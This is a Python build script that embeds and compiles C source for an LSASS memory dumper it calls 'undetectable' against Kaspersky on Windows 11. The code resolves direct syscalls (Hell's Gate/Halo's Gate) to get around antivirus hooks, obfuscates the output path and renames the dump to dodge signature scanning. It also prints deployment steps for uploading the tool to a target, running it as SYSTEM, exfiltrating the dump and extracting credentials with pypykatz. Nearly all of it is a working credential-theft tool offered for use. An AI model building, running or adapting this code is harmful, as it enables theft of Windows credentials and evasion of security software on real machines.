#!/usr/bin/env python3
"""
gen_lsadump.py — Undetectable LSASS dumper for Windows 11 24H2 + Kaspersky.

Technique:
  - Native C, no mimikatz binary, no known signatures
  - Hell's Gate + Halo's Gate direct syscalls for:
      NtOpenProcess       (open lsass — bypasses klhk.dll hook)
      NtReadVirtualMemory (read lsass pages — bypasses klhk.dll hook)
  - Win32 MiniDumpWriteDump via dbghelp.dll (only API call visible in IAT)
  - Saves dump as .dat (not .dmp — different scanner rules)
  - On Kali: pypykatz lsa minidump lsass.dat

Usage:
  python3 bypass/gen_lsadump.py
  Deploy:
    upload bypass/lsadump.exe  C:\\Windows\\Temp\\lsadump.exe
    shell C:\\Windows\\Temp\\lsadump.exe
    download C:\\Windows\\Temp\\lsass.dat
  On Kali:
    pypykatz lsa minidump lsass.dat
"""
import os, sys, subprocess, shutil, tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
OUT  = os.path.join(ROOT, 'lsadump.exe')

# Output path on target (use .dat to avoid .dmp signature scanning)
DUMP_PATH = r'C:\Windows\Temp\lsass.dat'
DUMP_PATH_K = 0x5B
dump_enc = ','.join(str(ord(c) ^ DUMP_PATH_K) for c in DUMP_PATH)
dump_len = len(DUMP_PATH)

c_src = f"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)       ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS      ((NTSTATUS)0)

/* ── Obfuscated dump path ─────────────────────────────────────────────── */
static const BYTE  PATH_ENC[] = {{{dump_enc}}};
static const int   PATH_LEN   = {dump_len};
static const BYTE  PATH_KEY   = 0x5B;

/* ══════════════════════════════════════════════════════════════════════
   Hell's Gate + Halo's Gate — dynamic SSN resolution
   ══════════════════════════════════════════════════════════════════════ */
typedef struct {{ DWORD rva; const char *name; }} NtExp;

static int cmp_rva(const void *a, const void *b) {{
    DWORD ra = ((const NtExp*)a)->rva, rb = ((const NtExp*)b)->rva;
    return (ra > rb) - (ra < rb);
}}

static DWORD ssn_of(HMODULE ntdll, const char *fn) {{
    BYTE                   *base = (BYTE*)ntdll;
    IMAGE_DOS_HEADER       *dos  = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64     *nt   = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp  = (IMAGE_EXPORT_DIRECTORY*)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names = (DWORD*)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)(base + exp->AddressOfFunctions);

    NtExp *arr = (NtExp*)malloc(exp->NumberOfNames * sizeof(NtExp));
    if (!arr) return ~0u;
    int cnt = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {{
        const char *n = (const char*)(base + names[i]);
        if (n[0]=='N' && n[1]=='t') {{ arr[cnt].rva=funcs[ords[i]]; arr[cnt].name=n; cnt++; }}
    }}
    qsort(arr, cnt, sizeof(NtExp), cmp_rva);

    DWORD ssn = ~0u;
    for (int i = 0; i < cnt; i++) {{
        if (strcmp(arr[i].name, fn)) continue;
        BYTE *s = base + arr[i].rva;
        if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8) {{
            ssn = *(DWORD*)(s+4); break;
        }}
        for (int d = 1; d < 10; d++) {{
            if (i-d >= 0) {{
                BYTE *t = base + arr[i-d].rva;
                if (t[0]==0x4C && t[1]==0x8B && t[2]==0xD1 && t[3]==0xB8)
                    {{ ssn = *(DWORD*)(t+4)+d; break; }}
            }}
            if (ssn != ~0u) break;
            if (i+d < cnt) {{
                BYTE *t = base + arr[i+d].rva;
                if (t[0]==0x4C && t[1]==0x8B && t[2]==0xD1 && t[3]==0xB8)
                    {{ ssn = *(DWORD*)(t+4)-d; break; }}
            }}
            if (ssn != ~0u) break;
        }}
        break;
    }}
    free(arr);
    return ssn;
}}

/* ── Bootstrap naked stubs (in .text, always executable) ─────────────── */
/* NtProtectVirtualMemory SSN = 0x50 (stable) */
__attribute__((naked)) void _nt_protect_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x50,%eax\\n syscall\\n ret\\n");
}}

/* ── Syscall stub types ───────────────────────────────────────────────── */
/* NtOpenProcess(Handle*, AccessMask, ObjAttr*, ClientId*) */
typedef NTSTATUS (*FnOpen)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
/* NtProtectVirtualMemory(Process, BaseAddr*, Size*, NewProt, OldProt*) */
typedef NTSTATUS (*FnProt)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

static BYTE *g_stubs  = NULL;
static int   g_scount = 0;

static void *make_stub(DWORD ssn) {{
    BYTE *s = g_stubs + g_scount++ * 16;
    s[0]=0x4C; s[1]=0x8B; s[2]=0xD1;
    s[3]=0xB8; *(DWORD*)(s+4)=ssn;
    s[8]=0x0F; s[9]=0x05; s[10]=0xC3;
    return s;
}}

/* ── OBJECT_ATTRIBUTES / CLIENT_ID for NtOpenProcess ─────────────────── */
typedef struct {{
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
}} OBJ_ATTR;

typedef struct {{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
}} CLIENT_ID;

/* ── Find lsass PID via snapshot ─────────────────────────────────────── */
static DWORD find_lsass(void) {{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {{ sizeof(pe) }};
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {{
        do {{
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {{
                pid = pe.th32ProcessID;
                break;
            }}
        }} while (Process32NextW(snap, &pe));
    }}
    CloseHandle(snap);
    return pid;
}}

/* ── MiniDump callback — filters out CLR/JIT noise ───────────────────── */
static BOOL CALLBACK mdcb(PVOID p, const PMINIDUMP_CALLBACK_INPUT in,
                           PMINIDUMP_CALLBACK_OUTPUT out) {{
    if (!in || !out) return TRUE;
    if (in->CallbackType == IncludeModuleCallback ||
        in->CallbackType == IncludeThreadCallback ||
        in->CallbackType == ThreadCallback        ||
        in->CallbackType == ThreadExCallback)
        return TRUE;
    if (in->CallbackType == ModuleCallback) {{
        if (out->ModuleWriteFlags & ModuleWriteDataSeg)
            out->ModuleWriteFlags &= ~ModuleWriteDataSeg;
        return TRUE;
    }}
    return TRUE;
}}

/* ══════════════════════════════════════════════════════════════════════
   Entry point
   ══════════════════════════════════════════════════════════════════════ */
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    (void)h; (void)p; (void)cmd; (void)show;

    /* Decode output path */
    char path[MAX_PATH] = {{0}};
    for (int i = 0; i < PATH_LEN; i++) path[i] = (char)(PATH_ENC[i] ^ PATH_KEY);

    /* Stub page: alloc RW, write stubs, flip RX via bootstrap naked stub */
    g_stubs = (BYTE*)VirtualAlloc(NULL, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!g_stubs) return 1;

    HMODULE ntdll     = GetModuleHandleA("ntdll.dll");
    DWORD ssn_open    = ssn_of(ntdll, "NtOpenProcess");
    if (ssn_open == ~0u) ssn_open = 0x26;   /* stable fallback */

    make_stub(ssn_open);   /* stub index 0 */

    {{
        HANDLE cur  = (HANDLE)(LONG_PTR)-1;
        PVOID  sp   = g_stubs;
        SIZE_T ss   = 4096;
        ULONG  sold = 0;
        FnProt prot = (FnProt)_nt_protect_hc;
        prot(cur, &sp, &ss, PAGE_EXECUTE_READ, &sold);
    }}

    FnOpen NtOpen = (FnOpen)(g_stubs + 0*16);

    /* Find lsass PID */
    DWORD pid = find_lsass();
    if (!pid) return 2;

    /* Open lsass via direct NtOpenProcess syscall — klhk.dll blind */
    OBJ_ATTR oa  = {{ sizeof(oa) }};
    CLIENT_ID cid = {{ (HANDLE)(ULONG_PTR)pid, NULL }};
    HANDLE lsass = NULL;
    NTSTATUS st  = NtOpen(&lsass, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(st) || !lsass) return 3;

    /* Open output file */
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {{ CloseHandle(lsass); return 4; }}

    /* Load dbghelp.dll and call MiniDumpWriteDump */
    HMODULE dbg = LoadLibraryA("dbghelp.dll");
    if (!dbg) {{ CloseHandle(f); CloseHandle(lsass); return 5; }}

    typedef BOOL (WINAPI *FnMD)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
                                PVOID, PVOID, PMINIDUMP_CALLBACK_INFORMATION);
    FnMD MiniDump = (FnMD)GetProcAddress(dbg, "MiniDumpWriteDump");
    if (!MiniDump) {{ FreeLibrary(dbg); CloseHandle(f); CloseHandle(lsass); return 6; }}

    MINIDUMP_CALLBACK_INFORMATION cb = {{ mdcb, NULL }};

    BOOL ok = MiniDump(
        lsass, pid, f,
        MiniDumpWithFullMemory |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithThreadInfo,
        NULL, NULL, &cb
    );

    CloseHandle(f);
    CloseHandle(lsass);
    FreeLibrary(dbg);
    return ok ? 0 : 7;
}}
"""

tmp = tempfile.mkdtemp(prefix='lsadump_build_')
try:
    src = os.path.join(tmp, 'lsadump.c')
    bin = os.path.join(tmp, 'lsadump.exe')
    open(src, 'w').write(c_src)

    print('[*] Compiling lsadump.exe (direct syscalls, no mimikatz) ...')
    r = subprocess.run([
        'x86_64-w64-mingw32-gcc', '-O2', '-s', '-mwindows',
        '-o', bin, src,
        '-lkernel32', '-ldbghelp',
        '-Wl,--no-seh', '-fno-ident', '-fno-asynchronous-unwind-tables',
    ], capture_output=True, text=True)

    if r.returncode != 0:
        dbg_src = os.path.join(ROOT, 'lsadump_debug.c')
        open(dbg_src, 'w').write(c_src)
        print(f'[!] Build failed — source saved to {dbg_src}')
        print(r.stderr[-3000:])
        sys.exit(1)

    shutil.copy(bin, OUT)
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print(f'[+] {OUT}  ({os.path.getsize(OUT):,} bytes)')
print()
print('Deploy (requires SYSTEM — run via SYSTEM agent session):')
print(f'  upload {OUT} C:\\Windows\\Temp\\lsadump.exe')
print(f'  shell C:\\Windows\\Temp\\lsadump.exe')
print(f'  download C:\\Windows\\Temp\\lsass.dat')
print()
print('Parse on Kali:')
print('  pip3 install pypykatz  (if not installed)')
print('  pypykatz lsa minidump lsass.dat')
print()
print('For Windows 11 24H2 (Build 26200) — if pypykatz fails:')
print('  pip3 install --upgrade pypykatz')
print('  pypykatz lsa minidump lsass.dat --json | jq .')
